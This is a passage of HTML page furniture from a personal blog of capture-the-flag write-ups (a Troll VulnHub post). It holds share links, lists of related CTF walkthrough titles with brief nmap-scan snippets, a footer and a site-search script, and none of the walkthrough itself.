<a href="whatsapp://send?text=https://blog.gauravraj.xyz/posts/troll-vulnhub-machine-writeup-and-walkthrough/" data-toggle="tooltip" data-placement="top" title="Whatsapp" target="_blank" rel="noopener" aria-label="Whatsapp"> <i class="fa-fw fab fa-whatsapp-square"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Troll Vunhub Machine Writeup and Walkthrough - Gaurav Raj&u=https://blog.gauravraj.xyz/posts/troll-vulnhub-machine-writeup-and-walkthrough/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Troll Vunhub Machine Writeup and Walkthrough - Gaurav Raj&url=https://blog.gauravraj.xyz/posts/troll-vulnhub-machine-writeup-and-walkthrough/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/ohmywebserver-tryhackme-writeup-and-walkthrough/">Oh My WebServer TryHackMe Machine Writeup and Walkthrough</a><li><a href="/posts/Plugins-With-vim-plug-in-Neovim/">Plugins with vim-plug in NeoVim</a><li><a href="/posts/troll-2-vulnhub-machine-writeup-and-walkthrough/">Troll 2 Vunhub Machine Writeup and Walkthrough</a><li><a href="/posts/dns-in-detail-tryhackme-machine-writeup-and-walkthrough/">DNS in Detail TryHackMe Machine Writeup and Walkthrough</a><li><a href="/posts/vulnnet-internal-tryhackme-machine-writeup-and-walkthough-detailed/">Vulnnet Internal TryHackMe Machine Writeup and Walkthrough</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/thehackersbrain/">thehackersbrain</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/gaurav-raj/">gaurav raj</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div><div class='jekyll-twitter-plugin' align='center'><div class='jekyll-twitter-plugin'><a class="twitter-timeline" data-width="500" data-tweet-limit="2" href="https://twitter.com/thehackersbrain?ref_src=twsrc%5Etfw">Tweets by thehackersbrain</a> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/cap-hackthebox-machine-writeup-and-walkthrough/"><div class="card-body"> <span class="timeago small" > Jun 10, 2021 <i class="unloaded">2021-06-10T11:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cap HackTheBox Machine Writeup and Walkthrough</h3><div class="text-muted small"><p> Cap HackTheBox Easy Level Machine Nmap Scan # Nmap 7.91 scan initiated Thu Jun 10 11:56:18 2021 as: nmap -sC -sV -A -v -oN nmap/initial 10.10.10.245 Nmap scan report for 10.10.10.245 Host is u...</p></div></div></a></div><div class="card"> <a href="/posts/biteme-tryhackme-detailed-writeup-and-walkthrough/"><div class="card-body"> <span class="timeago small" > Mar 17 <i class="unloaded">2022-03-17T12:58:30+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Bite Me TryHackMe Detailed Writeup and Walkthrough</h3><div class="text-muted small"><p> Information Target IP 1 export IP=10.10.73.114 Enumeration Nmap Scan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 # Nma...</p></div></div></a></div><div class="card"> <a href="/posts/ohmywebserver-tryhackme-writeup-and-walkthrough/"><div class="card-body"> <span class="timeago small" > Mar 13 <i class="unloaded">2022-03-13T21:35:30+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Oh My WebServer TryHackMe Machine Writeup and Walkthrough</h3><div class="text-muted small"><p> Introduction Target Machine Oh My WebServer Target IP 1 export IP=10.10.237.191 Enumeration First of all let’s get started by a Nmap Scan. Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/cap-hackthebox-machine-writeup-and-walkthrough/" class="btn btn-outline-primary" prompt="Older"><p>Cap HackTheBox Machine Writeup and Walkthrough</p></a> <a href="/posts/Stack-Based-Buffer-Overflow-x86-linux-HackTheBox-Academy-Writeup-and-walkthrough/" class="btn btn-outline-primary" prompt="Newer"><p>Stack Based Buffer Overflow x86 Linux HackTheBox Academy Writeup and Walkthrough</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/thehackersbrain">Gaurav Raj</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://gauravraj.tech/" target="_blank" rel="noopener">Gaurav Raj</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/thehackersbrain/">thehackersbrain</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/gaurav-raj/">gaurav raj</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://blog.gauravraj.xyz{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
